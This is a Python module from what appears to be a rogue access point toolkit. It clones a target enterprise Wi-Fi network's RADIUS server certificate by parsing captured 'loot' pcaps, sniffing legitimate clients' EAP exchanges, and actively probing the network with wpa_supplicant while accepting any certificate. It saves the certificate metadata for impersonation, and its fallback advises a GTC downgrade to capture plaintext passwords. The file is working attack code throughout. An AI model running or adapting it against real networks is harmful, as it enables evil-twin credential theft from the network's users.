"""
cert_clone.py — Extract the real AP's RADIUS server certificate
using a 4-step fallback strategy:

  Step 1: Parse existing pcap files for TLS Certificate in EAP frames (passive, instant)
  Step 2: Passive sniff on monitor iface for legitimate client EAP exchanges
  Step 3: Active probe with wpa_supplicant (NM killed, dedicated config, longer timeout)
  Step 4: Fallback to generic cert + recommend GTC downgrade

The RADIUS server sits behind the AP — clients never talk to it directly.
The TLS cert only appears inside EAP-PEAP/TTLS packets relayed by the AP.
"""

import subprocess
import time
import os
import re
import json
import glob
import struct

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CERT_DIR = os.path.join(BASE_DIR, "certs")
LOOT_DIR = os.path.join(BASE_DIR, "loot")

CERT_PEM_PATH = "/tmp/eapx_radius_cert.pem"


# ═══════════════════════════════════════════════════════════════
# Step 1: Parse existing PCAP files for the RADIUS cert
# ═══════════════════════════════════════════════════════════════

def _extract_cert_from_pcap(pcap_path):
    """
    Read a pcap file and look for TLS Server Certificate inside
    EAP-PEAP/TTLS frames. The cert is embedded in the EAP payload
    as a TLS handshake record (content_type=22, handshake_type=11).
    """

    if not os.path.exists(pcap_path):
        return None

    try:
        from scapy.all import rdpcap, EAP, Raw
    except ImportError:
        print("[!] scapy not available for pcap parsing")
        return None

    print(f"[*] Parsing {os.path.basename(pcap_path)} for RADIUS cert...")

    try:
        packets = rdpcap(pcap_path)
    except Exception as e:
        print(f"[!] Failed to read pcap: {e}")
        return None

    # Accumulate EAP-TLS fragments — the cert is often fragmented
    # across multiple EAP packets
    tls_buffer = bytearray()

    for pkt in packets:
        raw_data = None

        # Try to get EAP layer payload
        if pkt.haslayer(EAP):
            eap = pkt[EAP]
            # EAP-PEAP type=25, EAP-TLS type=13, EAP-TTLS type=21
            if hasattr(eap, 'type') and eap.type in (13, 21, 25):
                if pkt.haslayer(Raw):
                    raw_data = bytes(pkt[Raw].load)
                elif hasattr(eap, 'payload') and eap.payload:
                    raw_data = bytes(eap.payload)

        # Also check for raw 802.1X frames with EAP data
        if raw_data is None and pkt.haslayer(Raw):
            load = bytes(pkt[Raw].load)
            # Check for EAP packet: code=1 (Request) and type in [13,21,25]
            if len(load) > 5 and load[0] in (1, 2) and load[4] in (13, 21, 25):
                raw_data = load[5:]  # skip EAP header

        if raw_data and len(raw_data) > 0:
            tls_buffer.extend(raw_data)

    # Search the assembled buffer for a TLS Certificate message
    cert_pem = _find_certificate_in_tls(tls_buffer)
    if cert_pem:
        return cert_pem

    return None


def _find_certificate_in_tls(data):
    """
    Search raw bytes for a DER-encoded X.509 certificate inside
    a TLS handshake. The Certificate message has handshake type 0x0b.

    TLS Record:  content_type(1) version(2) length(2) ...
    Handshake:   type(1) length(3) ...
    Certificate: certs_length(3) cert_length(3) cert_data(...)
    """
    data = bytes(data)

    for i in range(len(data) - 10):
        # Look for TLS Handshake record (content_type=22)
        if data[i] == 0x16 and data[i+1] == 0x03 and data[i+2] in (0x01, 0x02, 0x03, 0x04):
            # TLS record found — check for Certificate handshake (type=0x0b)
            record_len = struct.unpack("!H", data[i+3:i+5])[0]
            payload_start = i + 5

            if payload_start < len(data) and data[payload_start] == 0x0b:
                # Certificate handshake message
                hs_len = struct.unpack("!I", b'\x00' + data[payload_start+1:payload_start+4])[0]
                certs_start = payload_start + 4

                if certs_start + 3 < len(data):
                    # Total certificates length
                    total_certs_len = struct.unpack("!I", b'\x00' + data[certs_start:certs_start+3])[0]
                    cert_start = certs_start + 3

                    if cert_start + 3 < len(data):
                        # First certificate length
                        cert_len = struct.unpack("!I", b'\x00' + data[cert_start:cert_start+3])[0]
                        cert_data_start = cert_start + 3

                        if cert_data_start + cert_len <= len(data) and cert_len > 100:
                            der_cert = data[cert_data_start:cert_data_start + cert_len]
                            return _der_to_pem(der_cert)

        # Also look for the handshake type directly (fragmented TLS)
        if data[i] == 0x0b and i + 7 < len(data):
            hs_len = struct.unpack("!I", b'\x00' + data[i+1:i+4])[0]
            if 100 < hs_len < 10000:  # reasonable cert size
                certs_start = i + 4
                if certs_start + 3 < len(data):
                    total_len = struct.unpack("!I", b'\x00' + data[certs_start:certs_start+3])[0]
                    cert_start = certs_start + 3
                    if cert_start + 3 < len(data):
                        cert_len = struct.unpack("!I", b'\x00' + data[cert_start:cert_start+3])[0]
                        if cert_start + 3 + cert_len <= len(data) and cert_len > 100:
                            der_cert = data[cert_start+3:cert_start+3+cert_len]
                            return _der_to_pem(der_cert)

    return None


def _der_to_pem(der_bytes):
    """Convert DER certificate to PEM format and save."""
    import base64
    b64 = base64.encodebytes(der_bytes).decode("ascii")
    pem = f"-----BEGIN CERTIFICATE-----\n{b64}-----END CERTIFICATE-----\n"

    with open(CERT_PEM_PATH, "w") as f:
        f.write(pem)

    # Verify it's a valid cert
    result = subprocess.run(
        ["openssl", "x509", "-in", CERT_PEM_PATH, "-noout", "-subject"],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        print(f"[+] Valid certificate extracted: {result.stdout.strip()}")
        return CERT_PEM_PATH
    else:
        print("[!] Extracted data is not a valid certificate")
        try:
            os.remove(CERT_PEM_PATH)
        except OSError:
            pass
        return None


def _step1_parse_existing_pcaps():
    """Step 1: Check all existing pcap files in loot/ for the RADIUS cert."""

    print("\n[Step 1/4] Searching existing packet captures for RADIUS cert...")

    pcap_files = sorted(
        glob.glob(os.path.join(LOOT_DIR, "*.pcap")),
        key=os.path.getmtime, reverse=True  # newest first
    )

    if not pcap_files:
        print("    [*] No pcap files found in loot/")
        return None

    print(f"    [*] Found {len(pcap_files)} pcap file(s)")

    for pcap in pcap_files:
        cert_path = _extract_cert_from_pcap(pcap)
        if cert_path:
            print(f"    [+] Certificate found in {os.path.basename(pcap)}")
            return cert_path

    print("    [*] No certificate found in existing captures")
    return None


# ═══════════════════════════════════════════════════════════════
# Step 2: Passive sniff for legitimate client EAP exchanges
# ═══════════════════════════════════════════════════════════════

def _step2_passive_sniff(iface, essid, timeout=30):
    """
    Step 2: Passively sniff on monitor interface for EAP packets
    from legitimate clients connecting to the target AP. When a real
    client connects, the AP relays the RADIUS cert in EAP-PEAP frames.
    """

    print(f"\n[Step 2/4] Passive sniff for client EAP exchanges ({timeout}s)...")
    print(f"    [*] Waiting for a legitimate client to connect to '{essid}'...")

    try:
        from scapy.all import sniff, Raw, EAP
    except ImportError:
        print("    [!] scapy not available")
        return None

    tls_buffer = bytearray()
    found_cert = [None]  # mutable reference for callback

    def eap_handler(pkt):
        if found_cert[0]:
            return  # already found

        if pkt.haslayer(Raw):
            raw = bytes(pkt[Raw].load)
            tls_buffer.extend(raw)

            cert_path = _find_certificate_in_tls(tls_buffer)
            if cert_path:
                found_cert[0] = cert_path
                print(f"\n    [+] Captured RADIUS certificate from live traffic!")

    try:
        sniff(
            iface=iface,
            prn=eap_handler,
            store=0,
            timeout=timeout,
            filter="ether proto 0x888e",
            stop_filter=lambda p: found_cert[0] is not None,
        )
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"    [!] Sniff error: {e}")

    if found_cert[0]:
        return found_cert[0]

    print(f"    [*] No EAP certificate seen in {timeout}s")
    return None


# ═══════════════════════════════════════════════════════════════
# Step 3: Active probe with wpa_supplicant
# ═══════════════════════════════════════════════════════════════

def _step3_active_probe(iface, essid, bssid=None, timeout=40):
    """
    Step 3: Actively probe the AP by associating with wpa_supplicant.
    Kills NetworkManager to prevent interference. Uses a longer timeout.
    """

    print(f"\n[Step 3/4] Active probe via wpa_supplicant ({timeout}s)...")

    clean_iface = iface.replace("mon", "")
    conf_path = "/tmp/eapx_certprobe.conf"

    # Kill NetworkManager to prevent interference
    print("    [*] Stopping NetworkManager...")
    subprocess.run(["systemctl", "stop", "NetworkManager"],
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    subprocess.run(["killall", "wpa_supplicant"],
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    time.sleep(1)

    # Build config — accept ANY cert, target specific BSSID if known
    bssid_line = f"\n    bssid={bssid}" if bssid else ""
    conf = f"""ctrl_interface=/tmp/eapx_wpa
network={{
    ssid="{essid}"{bssid_line}
    key_mgmt=WPA-EAP
    eap=PEAP TTLS
    identity="certprobe@eapx.local"
    password="wrongpassword"
    ca_cert=""
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}}
"""
    with open(conf_path, "w") as f:
        f.write(conf)

    print(f"    [*] Probing '{essid}' on interface {clean_iface}...")

    # Remove old cert file
    try:
        os.remove(CERT_PEM_PATH)
    except OSError:
        pass

    proc = subprocess.Popen(
        [
            "wpa_supplicant",
            "-i", clean_iface,
            "-c", conf_path,
            "-D", "nl80211",
            "-d",  # debug output shows cert in PEM format
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )

    cert_lines = []
    in_cert = False
    cert_path = None
    start = time.time()

    try:
        while time.time() - start < timeout:
            line = proc.stdout.readline()
            if not line:
                break

            # wpa_supplicant -d shows the cert in PEM format
            if "-----BEGIN CERTIFICATE-----" in line:
                in_cert = True
                cert_lines = ["-----BEGIN CERTIFICATE-----\n"]
                continue

            if in_cert:
                cert_lines.append(line.strip() + "\n")
                if "-----END CERTIFICATE-----" in line:
                    in_cert = False
                    with open(CERT_PEM_PATH, "w") as f:
                        f.writelines(cert_lines)

                    # Verify it's valid
                    vfy = subprocess.run(
                        ["openssl", "x509", "-in", CERT_PEM_PATH, "-noout", "-subject"],
                        capture_output=True, text=True
                    )
                    if vfy.returncode == 0:
                        cert_path = CERT_PEM_PATH
                        print(f"    [+] Captured RADIUS certificate via active probe")
                        print(f"        {vfy.stdout.strip()}")
                        break
                    else:
                        print("    [!] Extracted cert invalid, continuing...")
                        cert_lines = []

            # Also detect if wpa_supplicant logs the cert fingerprint
            if "TLS: tls_connection_server_cert" in line:
                print("    [*] TLS handshake detected — extracting cert...")

            # Detect association failure
            if "CTRL-EVENT-ASSOC-REJECT" in line or "CTRL-EVENT-AUTH-REJECT" in line:
                print("    [!] Association rejected — AP may require specific credentials")

    except Exception as e:
        print(f"    [!] Error during probe: {e}")
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

    # Cleanup
    try:
        os.remove(conf_path)
    except OSError:
        pass

    # Restart NetworkManager
    print("    [*] Restarting NetworkManager...")
    subprocess.run(["systemctl", "start", "NetworkManager"],
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

    return cert_path


# ═══════════════════════════════════════════════════════════════
# Certificate metadata parsing (shared by all steps)
# ═══════════════════════════════════════════════════════════════

def _parse_cert_metadata(cert_pem_path):
    """Parse a PEM certificate with openssl and extract subject fields."""

    metadata = {
        "cn": None,
        "org": None,
        "ou": None,
        "country": None,
        "san": [],
        "issuer_cn": None,
        "issuer_org": None,
        "not_before": None,
        "not_after": None,
    }

    if not cert_pem_path or not os.path.exists(cert_pem_path):
        return metadata

    result = subprocess.run(
        ["openssl", "x509", "-in", cert_pem_path, "-noout", "-subject",
         "-issuer", "-dates", "-ext", "subjectAltName"],
        capture_output=True, text=True
    )

    output = result.stdout + result.stderr

    # Parse subject: subject=C = US, O = Corp, OU = IT, CN = radius.corp.local
    subject_match = re.search(r"subject\s*=\s*(.+)", output)
    if subject_match:
        subj = subject_match.group(1)
        for field in subj.split(","):
            field = field.strip()
            if field.startswith("CN") or field.startswith("CN "):
                metadata["cn"] = field.split("=", 1)[1].strip()
            elif field.startswith("O") and not field.startswith("OU"):
                metadata["org"] = field.split("=", 1)[1].strip()
            elif field.startswith("OU"):
                metadata["ou"] = field.split("=", 1)[1].strip()
            elif field.startswith("C") and "=" in field:
                val = field.split("=", 1)[1].strip()
                if len(val) == 2:  # country codes are 2 chars
                    metadata["country"] = val

    # Parse issuer
    issuer_match = re.search(r"issuer\s*=\s*(.+)", output)
    if issuer_match:
        issuer = issuer_match.group(1)
        for field in issuer.split(","):
            field = field.strip()
            if field.startswith("CN") or field.startswith("CN "):
                metadata["issuer_cn"] = field.split("=", 1)[1].strip()
            elif field.startswith("O") and not field.startswith("OU"):
                metadata["issuer_org"] = field.split("=", 1)[1].strip()

    # Parse dates
    before_match = re.search(r"notBefore\s*=\s*(.+)", output)
    if before_match:
        metadata["not_before"] = before_match.group(1).strip()

    after_match = re.search(r"notAfter\s*=\s*(.+)", output)
    if after_match:
        metadata["not_after"] = after_match.group(1).strip()

    # Parse SAN
    metadata["san"] = re.findall(r"DNS:([^\s,]+)", output)

    return metadata


# ═══════════════════════════════════════════════════════════════
# Main entry point — 4-step fallback chain
# ═══════════════════════════════════════════════════════════════

def clone_radius_cert(iface, essid, bssid=None):
    """
    4-step RADIUS certificate cloning:

    Step 1: Parse existing pcap files in loot/ (passive, instant)
    Step 2: Passive sniff on monitor iface for legit client EAP (30s)
    Step 3: Active probe with wpa_supplicant (NM killed, 40s)
    Step 4: Fallback — return None, recommend GTC downgrade

    Returns metadata dict or None.
    """

    print("\n╔══════════════════════════════════════╗")
    print("║      RADIUS Certificate Cloning      ║")
    print("╚══════════════════════════════════════╝")
    print()
    print("[*] Strategy: pcap parse → passive sniff → active probe → fallback")
    print()

    cert_path = None

    # ── Step 1: Parse existing PCAPs ──
    cert_path = _step1_parse_existing_pcaps()

    # ── Step 2: Passive sniff ──
    if not cert_path:
        cert_path = _step2_passive_sniff(iface, essid, timeout=30)

    # ── Step 3: Active probe ──
    if not cert_path:
        cert_path = _step3_active_probe(iface, essid, bssid, timeout=40)

    # ── Step 4: Fallback ──
    if not cert_path or not os.path.exists(cert_path):
        print("\n[Step 4/4] All extraction methods failed")
        print()
        print("╔══════════════════════════════════════════════════════════╗")
        print("║  ⚠  RADIUS certificate could not be extracted          ║")
        print("║                                                        ║")
        print("║  Possible reasons:                                     ║")
        print("║  • No clients connected during sniff window            ║")
        print("║  • AP uses EAP-TLS (mutual cert auth blocks probe)     ║")
        print("║  • NetworkManager interference on probe interface      ║")
        print("║                                                        ║")
        print("║  Falling back to generic certificate.                  ║")
        print("║  → Use --negotiate gtc-downgrade to capture plaintext  ║")
        print("║    passwords even if client rejects the cert.          ║")
        print("╚══════════════════════════════════════════════════════════╝")
        print()
        return None

    # ── Success — parse and return metadata ──
    metadata = _parse_cert_metadata(cert_path)

    # Save metadata
    os.makedirs(LOOT_DIR, exist_ok=True)
    meta_path = os.path.join(LOOT_DIR, "radius_cert_metadata.json")
    with open(meta_path, "w") as f:
        json.dump(metadata, f, indent=2)

    # Copy the original cert for reference
    os.makedirs(CERT_DIR, exist_ok=True)
    orig_path = os.path.join(CERT_DIR, "original_radius.pem")
    subprocess.run(["cp", cert_path, orig_path], stderr=subprocess.DEVNULL)

    print(f"\n[+] Certificate metadata extracted:")
    print(f"    CN:      {metadata['cn'] or 'N/A'}")
    print(f"    Org:     {metadata['org'] or 'N/A'}")
    print(f"    OU:      {metadata['ou'] or 'N/A'}")
    print(f"    Country: {metadata['country'] or 'N/A'}")
    print(f"    SAN:     {', '.join(metadata['san']) if metadata['san'] else 'N/A'}")
    print(f"    Issuer:  {metadata['issuer_cn'] or 'N/A'} ({metadata['issuer_org'] or 'N/A'})")
    print(f"    Valid:   {metadata['not_before'] or '?'} → {metadata['not_after'] or '?'}")
    print(f"\n[+] Metadata saved → {meta_path}")

    return metadata
